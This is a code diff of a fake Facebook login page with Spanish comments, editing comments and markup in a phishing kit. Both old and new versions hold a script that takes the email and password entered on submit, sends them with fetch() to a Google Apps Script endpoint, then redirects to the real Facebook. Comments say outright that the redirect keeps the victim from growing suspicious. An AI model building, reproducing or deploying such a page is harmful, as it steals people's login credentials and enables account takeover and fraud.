@@ -4,24 +4,23 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - log in or sign up</title>
-    <!-- Enlace a la hoja de estilos CSS (style.css) -->
+    <!-- Enlace a la hoja de estilos CSS -->
     <link rel="stylesheet" href="style.css">
-    <!-- Icono de la pestaña (Favicon) -->
+    <!-- Enlace al icono de la pestaña (Favicon) de Facebook -->
     <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
 </head>
 <body>
 
-    <div class="content">
-        <!-- Sección izquierda con el logo y el eslogan -->
+    <div class="main-container">
+        <!-- Lado izquierdo: Logo y eslogan -->
         <div class="left-side">
             <h1 class="facebook-logo">facebook</h1>
             <h2 class="slogan">Connect with friends and the world around you on Facebook.</h2>
         </div>
 
-        <!-- Sección derecha con el formulario de inicio de sesión -->
+        <!-- Lado derecho: Formulario de inicio de sesión -->
         <div class="right-side">
             <div class="login-form-container">
-                <!-- El formulario ahora tiene un 'id' para poder seleccionarlo con JavaScript -->
                 <form id="loginForm">
                     <input type="text" name="email" placeholder="Email or phone number" required aria-label="Email or phone number">
                     <input type="password" name="password" placeholder="Password" required aria-label="Password">
@@ -36,7 +35,7 @@
             </p>
         </div>
     </div>
-
+    
     <footer class="page-footer">
         <div class="footer-content">
             <ul class="language-list">
@@ -91,42 +90,29 @@
         </div>
     </footer>
 
-
-    <!-- =================================================================== -->
-    <!-- SCRIPT PARA CAPTURAR Y ENVIAR DATOS A GOOGLE SHEETS                 -->
-    <!-- =================================================================== -->
+    <!-- Script para capturar y enviar datos -->
     <script>
         const form = document.getElementById('loginForm');
         form.addEventListener('submit', function(e) {
-            // 1. Previene el comportamiento por defecto del formulario (recargar la página)
             e.preventDefault();
-
-            // 2. ***** ¡Pega tu URL aquí! *****
-            // Reemplaza el texto de abajo con la URL de despliegue de tu Google Apps Script.
+            // ¡IMPORTANTE! REEMPLAZA ESTA LÍNEA CON TU URL REAL
             const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwjgSrFrLw1pXyuGFFLsI3f8KrTNFJYn-RhyRGbYK1c1fpob0FXShU-xojLiyrLxX74/exec';
-
-            // 3. Envía los datos del formulario (email y password) a tu script de Google.
-            // fetch() es el método moderno de JavaScript para hacer peticiones web.
+            
             fetch(SCRIPT_URL, {
                 method: 'POST',
                 body: new FormData(form)
             })
             .then(response => {
-                // 4. Una vez que los datos son enviados (con éxito o no), redirige al usuario.
-                // La redirección es crucial para que el usuario no sospeche nada.
-                // Piensa que simplemente escribió mal la contraseña.
-                console.log('Datos enviados. Redirigiendo a Facebook...');
+                // Redirige al usuario a la página real después de enviar los datos
                 window.location.href = 'https://www.facebook.com';
             })
             .catch(error => {
-                // 5. En caso de error, también redirige para ocultar el fallo.
-                console.error('Error al enviar los datos:', error.message);
+                console.error('Error al enviar datos:', error.message);
+                // También redirige si hay un error para no levantar sospechas
                 window.location.href = 'https://www.facebook.com';
             });
         });
     </script>
-    <!-- =================================================================== -->
-
 
 </body>
 </html>
